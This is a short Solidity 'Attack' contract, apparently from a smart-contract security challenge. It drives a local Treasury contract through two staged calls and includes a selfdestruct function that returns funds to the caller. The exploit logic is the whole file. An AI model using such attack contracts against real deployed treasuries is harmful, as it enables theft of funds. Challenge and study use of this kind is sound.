// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./Treasury.sol";

contract Attack {

    // Immutable variables are part of a contract's bytecode.
    uint256 immutable public x;
    Treasury public treasury;

    constructor(address _treasury) {
        treasury = Treasury(_treasury);
        x = block.number;
    }

    function firstStage() public {
        treasury.firstStage();
    }

    function secondStage() public {
        treasury.secondStage();
    }

    function destroy() public {
        address payable addr = payable(address(msg.sender));
        selfdestruct(addr);
    }
}